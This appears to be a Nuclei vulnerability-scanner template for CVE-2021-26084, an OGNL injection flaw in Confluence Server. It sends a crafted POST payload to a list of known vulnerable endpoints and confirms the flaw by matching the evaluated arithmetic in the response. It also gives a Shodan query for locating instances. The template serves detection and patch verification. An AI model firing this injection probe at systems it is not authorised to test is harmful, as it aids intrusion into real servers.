id: CVE-2021-26084
info:
  name: Confluence Server - Remote Code Execution
  author: dhiyaneshDk,philippedelteil
  severity: critical
  description: A vulnerability in Confluence Server and Data Center versions before
    6.13.23, and from 6.14.0 to 7.12.5, allows authenticated and unauthenticated users
    to remotely execute code through a vulnerability in OGNL injection with non-administrator
    access.
  reference:
  - https://jira.atlassian.com/browse/CONFSERVER-67940
  - https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2021-26084
  - https://nvd.nist.gov/vuln/detail/CVE-2021-26084
  - https://github.com/Udyz/CVE-2021-26084
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-26084
    cwe-id: CWE-74
  metadata:
    shodan-query: http.component:"Atlassian Confluence"
    impact: The CVE-2021-26084 vulnerability in Confluence Server and Data Center
      could allow an authenticated or unauthenticated user to execute arbitrary code,
      potentially resulting in significant impact on the affected instance.
    recommendation: It is highly recommended to update Confluence Server and Data
      Center to versions 6.13.23, 7.4.11, 7.11.6, or 7.12.5 immediately to mitigate
      the risk of remote code execution.
  tags: cve,cve2021,rce,confluence,injection,ognl,kev
requests:
- raw:
  - 'POST /{{path}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb

    '
  payloads:
    path:
    - pages/createpage-entervariables.action?SpaceKey=x
    - pages/createpage-entervariables.action
    - confluence/pages/createpage-entervariables.action?SpaceKey=x
    - confluence/pages/createpage-entervariables.action
    - wiki/pages/createpage-entervariables.action?SpaceKey=x
    - wiki/pages/createpage-entervariables.action
    - pages/doenterpagevariables.action
    - pages/createpage.action?spaceKey=myproj
    - pages/templates2/viewpagetemplate.action
    - pages/createpage-entervariables.action
    - template/custom/content-editor
    - templates/editor-preload-container
    - users/user-dark-features
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - value="aaaa{140592=null}
